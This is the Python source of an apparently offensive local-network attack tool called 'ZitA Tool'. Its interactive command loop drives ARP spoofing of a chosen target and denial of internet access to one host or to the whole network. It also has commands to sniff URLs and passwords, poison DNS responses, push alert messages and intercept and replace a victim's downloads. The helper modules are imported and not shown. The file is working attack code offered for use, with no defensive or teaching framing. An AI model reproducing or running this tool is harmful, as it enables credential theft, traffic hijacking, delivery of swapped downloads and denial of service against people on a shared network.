from scapy.all import *
import subprocess,os,functions


try:
    from infos import *
except:
    exit("[-] Please make sure you are connected to a network.")

class ZitaNetwork:
    def __init__(self):

        if os.geteuid() != 0:
            exit("[-] You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
        print(
            """
\033[1;32;40m

          $$\   $$\      $$$$$$\        $$$$$$$$\                  $$\ 
          \__|  $$ |    $$  __$$\       \__$$  __|                 $$ |
$$$$$$$$\ $$\ $$$$$$\   $$ /  $$ |         $$ | $$$$$$\   $$$$$$\  $$ |
\____$$  |$$ |\_$$  _|  $$$$$$$$ |         $$ |$$  __$$\ $$  __$$\ $$ |
  $$$$ _/ $$ |  $$ |    $$  __$$ |         $$ |$$ /  $$ |$$ /  $$ |$$ |
 $$  _/   $$ |  $$ |$$\ $$ |  $$ |         $$ |$$ |  $$ |$$ |  $$ |$$ |
$$$$$$$$\ $$ |  \$$$$  |$$ |  $$ |         $$ |\$$$$$$  |\$$$$$$  |$$ |
\________|\__|   \____/ \__|  \__|         \__| \______/  \______/ \__|
  \033[0m                                                                     
"""
        )
    
    

    def main(self):
        g_commands = ["info","mac","scan","jamm","dnsspoof","alert","target","intercept","help","sniff"]
        t_commands = ["spoof","kick","pscan","help"]
        net = gateway + '/' + prefix
        gateway_mac = functions.get_target_mac(gateway)
        while(True):
            try:
                cmd = str(input("> "))
            except KeyboardInterrupt:
                exit("Exiting\n")

            if cmd.split(' ')[0] not in g_commands and len(cmd.split(' ')[0])>0:
                print("[-] Command not found\n")
        ################### Help ####################
            if cmd == "help":
                print(
"""
info                    Print basic information about the local network.
mac [spoofed_mac]       Change your current MAC address with spoofed_mac.
scan                    Scan your network for targets.
sniff                   Sniff urls and passwords of spoofed target.
jamm                    Deny internet access for all hosts on the network.
dnsspoof                Poison DNS request(s) of spoofed target. 
alert                   Display alert message for spoofed target.
target [target_ip]      Select target to perform additional attacks. 
intercept               Intercept and replace downloads of spoofed target.
"""
                )

        ################### Scanning ####################    
            if cmd == 'scan':
                hosts = functions.scan(net)
                print("IP Address"+2*'\t'+'MAC Address'+ 3*'\t' + 'Company Name')
                print(80*"-")
                n=0
                for element in hosts:
                    mac_company = functions.get_mac_vendor(element[1].src).strip()
                    print(element[0].pdst + 2*'\t' + element[1].src + 2*'\t' + mac_company)
                    n+=1
                print('\n' + '[+] ' + str(n) + ' Devices were discovered.' )

        ################### Sniffing ####################
            if cmd == "sniff":
                import Sniffer
                try:
                    Sniffer.sniff(interface)
                except KeyboardInterrupt:
                    print("\nSniffing stopped.")

            if cmd == 'exit':
                exit()
            if cmd == 'clear':
                os.system('clear')
            ################### Infos ####################
            if cmd == 'info':
                print('Network: ' + '\t'*3 + network)
                print('Gateway: ' + '\t'*3 + gateway)
                print('Interface: ' + '\t'*3 + interface)
                print('Local ip address: ' + '\t'*2 + localIp)
                print('MAC address: ' + '\t'*3 + mac)
            ################### Change MAC ########################
            if cmd.split(' ')[0]=='mac':
                functions.change_mac(interface,cmd.split(' ')[1])
            ################### Setting Target ####################
            if cmd.split(' ')[0]=='target':
                try:
                    target = cmd.split(' ')[1]
                    an, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target),timeout=2,verbose=False)
                    if(len(an)==0):
                        print("[-] Target Does not exist")
                    else:
                        while(True):
                                try:
                                    cmd = str(input("["+target+"] > "))
                                except KeyboardInterrupt:
                                    print('\n')
                                    break
                                if cmd.split(' ')[0] not in t_commands and len(cmd.split(' ')[0])>0:
                                    print("[-] Command not found\n")
                                if cmd == "exit":
                                    break
                                if cmd == 'clear':
                                    os.system('clear')
                        ########## help ###########
                                if cmd == "help":
                                    print(
"""
spoof               Perform an ARP spoof attack
kick                Deny internet access for target
pscan               Scan target for open ports
"""
                )
                                ############### Spoofing ##############
                                if cmd == "spoof":
                                    try:
                                        p = 0
                                        target_mac = functions.get_target_mac(target)
                                        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward',shell=True)
                                        while True:
                                            functions.spoof(target,target_mac,gateway,gateway_mac)
                                            p+=2
                                            print("\r\033[1;31;40mSending packets ["+ str(p) +"]\033[0m" ,end='')
                                            time.sleep(1)
                                    except KeyboardInterrupt:
                                        functions.restore(target,target_mac,gateway,gateway_mac)
                                        print("\nRestoring order ..")
                                        print("[+] Spoofing Stopped")
                                ############### kicking ##############      
                                if cmd == "kick":
                                    try:
                                        p = 0
                                        subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward',shell=True)
                                        target_mac = functions.get_target_mac(target)
                                        while True:
                                            functions.spoof(target,target_mac,gateway,gateway_mac)
                                            p+=2
                                            print("\r\033[1;31;40mSending packets ["+ str(p) +"]\033[0m" ,end='')
                                            time.sleep(1)
                                    except KeyboardInterrupt:
                                        functions.restore(target,target_mac,gateway,gateway_mac)
                                        print("\nRestoring order ..")
                                ############## Scaning Ports ####################
                                if cmd == "pscan":
                                    print("[+] Scannig first 10000 Ports\n")
                                    functions.scan_ports(target)
                except IndexError:
                    print("[-] Please select Target")                

            ################# jamming entire Network #########################
            if cmd == "jamm":
                subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward',shell=True)
                hosts = {}
                answered_list = functions.scan(net)
                for element in answered_list:
                    hosts[element[0].pdst]=element[1].src
                del hosts[gateway]
                try:
                    while True:
                        for target in hosts:
                            functions.spoof(target,hosts[target],gateway,gateway_mac)
                            print("\rJamming: " + target, end='')
                except KeyboardInterrupt:
                    for target in hosts:
                            target_mac = functions.get_target_mac(target)
                            functions.restore(target,hosts[target],gateway,gateway_mac)
                            print("\nrestoring: "+ target)
            ################ DNS spoofing ########################################
            if cmd == "dnsspoof":
                import dns_spoofer
                website = str(input("[+] Website you want to spoof: "))
                ipAddr = str(input("[+] IP of the website you want to be replaced with: "))
                dns_spoofer.set_global(website,ipAddr)
                dns_spoofer.start()
            ############### ALERT ###################################################
            if cmd == "alert":
                import alert
                alert.start()
            ################ Intercept ################################
            if cmd == "intercept":
                import intercept
                intercept.run()




z = ZitaNetwork()
z.main()